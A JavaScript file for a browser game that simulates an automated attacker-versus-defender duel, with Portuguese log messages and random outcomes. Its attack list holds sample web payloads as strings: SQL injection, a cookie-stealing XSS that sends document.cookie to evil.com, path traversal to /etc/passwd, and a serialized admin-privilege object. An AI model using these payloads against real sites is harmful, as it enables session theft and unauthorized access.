/**
 * BotWarEngine v1.0 - Automated Red vs Blue Duel
 * Simulates AI-driven attacks and automated mitigations.
 */
class BotWarEngine {
    constructor() {
        this.systemIntegrity = 100;
        this.exploitProgress = 0;
        this.isActive = false;
        this.interval = null;
        this.history = [];
    }

    startDuel() {
        this.isActive = true;
        this.systemIntegrity = 100;
        this.exploitProgress = 0;
        this.history = [];
        this.log('ARENA: Duelo de IAs iniciado. Red Bot vs Blue Bot (Gemma).', 'info');
        
        this.interval = setInterval(() => this.tick(), 2000);
    }

    stopDuel() {
        this.isActive = false;
        clearInterval(this.interval);
    }

    tick() {
        if (!this.isActive) return;

        // 1. RED BOT ACTION (Attack)
        const attack = this.generateAttack();
        this.log(`[RED] Lançando ${attack.type}: ${attack.payload}`, 'danger');

        // 2. BLUE BOT ACTION (Gemma Defense)
        setTimeout(() => {
            const success = Math.random() > 0.3; // 70% defense success rate
            if (success) {
                this.log(`[BLUE] Gemma detectou ${attack.type}. Aplicando ${attack.mitigation}...`, 'info');
                this.log(`[BLUE] Bloqueio efetuado. Sistema íntegro.`, 'success');
                this.exploitProgress = Math.max(0, this.exploitProgress - 5);
            } else {
                this.log(`[RED] ${attack.type} teve sucesso parcial!`, 'warning');
                this.systemIntegrity -= attack.damage;
                this.exploitProgress += 10;
            }

            this.updateUI();

            if (this.systemIntegrity <= 0) {
                this.log('!!! SISTEMA TOTALMENTE COMPROMETIDO - VITÓRIA RED BOT !!!', 'critical');
                this.stopDuel();
                window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'red_win' } }));
            } else if (this.exploitProgress >= 100) {
                this.log('!!! EXPLOIT COMPLETO - ACESSO ROOT CONCEDIDO !!!', 'critical');
                this.stopDuel();
                window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'red_win' } }));
            } else if (this.systemIntegrity > 0 && this.exploitProgress <= 0 && this.history.length > 20) {
                // Potential for Blue Win if they clear the threat? Actually let's keep it simple: 
                // Red wins if integrity is 0. Blue wins if they can stop the timer? 
                // Let's add a survival timer or just allow Blue to win by keeping integrity high.
            }
        }, 1000);
    }

    generateAttack() {
        const attacks = [
            { type: 'SQL Injection', payload: "' OR 1=1--", mitigation: 'WAF Rule #42', damage: 15 },
            { type: 'Buffer Overflow', payload: "A".repeat(512) + "\xef\xbe\xad\xde", mitigation: 'ASLR/DEP Check', damage: 25 },
            { type: 'XSS Stored', payload: "<script>fetch('https://evil.com?c='+document.cookie)</script>", mitigation: 'CSP Policy', damage: 10 },
            { type: 'Directory Traversal', payload: "../../../etc/passwd", mitigation: 'Chroot/Jail', damage: 20 },
            { type: 'RCE via Deserialization', payload: "O:4:\"User\":1:{s:8:\"isAdmin\";b:1;}", mitigation: 'Input Sanitization', damage: 30 }
        ];
        return attacks[Math.floor(Math.random() * attacks.length)];
    }

    log(msg, type) {
        const entry = { msg, type, time: new Date().toLocaleTimeString() };
        this.history.unshift(entry);
        if (this.history.length > 30) this.history.pop();
        window.dispatchEvent(new CustomEvent('bot_war_log', { detail: entry }));
    }

    manualAttack(type) {
        if (!this.isActive) return;
        const attack = this.getAttackByType(type);
        this.log(`[USER-RED] Lançando ${attack.type} MANUAL!`, 'danger');
        this.systemIntegrity -= attack.damage;
        this.exploitProgress += 10;
        this.updateUI();
        os.showNotification('Ataque Manual Enviado!', 'danger');
    }

    manualDefend(type) {
        if (!this.isActive) return;
        this.log(`[USER-BLUE] Aplicando contra-medida MANUAL para ${type}...`, 'success');
        this.systemIntegrity = Math.min(100, this.systemIntegrity + 10);
        this.exploitProgress = Math.max(0, this.exploitProgress - 15);
        this.updateUI();
        os.showNotification('Defesa Manual Aplicada!', 'success');
    }

    getAttackByType(type) {
        const attacks = {
            'sqli': { type: 'SQL Injection', damage: 15 },
            'bof': { type: 'Buffer Overflow', damage: 25 },
            'xss': { type: 'XSS', damage: 10 }
        };
        return attacks[type] || attacks['sqli'];
    }

    updateUI() {
        window.dispatchEvent(new CustomEvent('bot_war_update', { 
            detail: { 
                integrity: this.systemIntegrity, 
                progress: this.exploitProgress 
            } 
        }));
    }
}

window.botWar = new BotWarEngine();
